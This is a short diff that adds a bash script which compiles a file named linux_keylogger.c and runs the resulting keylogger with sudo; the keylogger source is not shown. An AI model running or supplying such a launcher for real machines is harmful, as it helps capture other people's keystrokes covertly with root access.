@@ -1,0 +1,7 @@
+#!/bin/bash
+cd ..
+gcc linux_keylogger.c -o keylogger
+mv keylogger ..
+cd ..
+sudo ./keylogger
+
